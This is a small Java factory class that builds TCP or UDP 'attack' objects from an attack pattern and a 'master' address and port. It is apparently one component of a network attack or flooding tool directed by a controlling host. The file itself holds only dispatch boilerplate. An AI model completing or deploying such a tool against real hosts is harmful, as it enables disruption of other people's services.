package utilies;

import protocols.interfaces.Protocol;
import protocols.implementation.TransmissionControlProtocol;
import protocols.implementation.UserDatagramProtocol;

public class AttackFactory {

    public static Protocol createAttack(AttackPattern attackPattern, String masterAddress, int masterPort) {
        if(attackPattern.getProtocol().equalsIgnoreCase("tcp")) {
            return new TransmissionControlProtocol(attackPattern, masterAddress, masterPort);
        }else if(attackPattern.getProtocol().equalsIgnoreCase("udp")) {
            return new UserDatagramProtocol(attackPattern, masterAddress, masterPort);
        }else {
            return new TransmissionControlProtocol(attackPattern, masterAddress, masterPort);
        }
    }
}